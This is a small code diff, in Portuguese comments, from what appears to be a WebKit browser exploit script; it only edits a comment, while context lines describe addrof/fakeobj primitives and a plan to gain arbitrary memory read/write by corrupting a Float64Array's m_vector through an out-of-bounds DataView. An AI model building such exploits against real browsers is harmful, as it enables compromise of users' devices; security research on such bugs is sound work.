@@ -114,7 +114,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         logFn("Primitivas 'addrof_core' e 'fakeobj_core' (no core_exploit.mjs) estão prontas.", "good");
         await pauseFn(LOCAL_SHORT_PAUSE);
 
-        // --- FASE 3: Construindo Primitivas de Leitura/Escrita Arbitrária TOTAL ---
+        // --- FASE 3: Construindo Primitivas de Leitura/Escrita Arbitrária TOTAL (corrupção de m_vector) ---
         // A estratégia é corromper o m_vector de um Float64Array usando o DataView OOB.
         logFn("--- FASE 3: Construindo primitivas de Leitura/Escrita Arbitrária TOTAL (corrupção de m_vector) ---", "subtest");
         const arbSetupStartTime = performance.now();
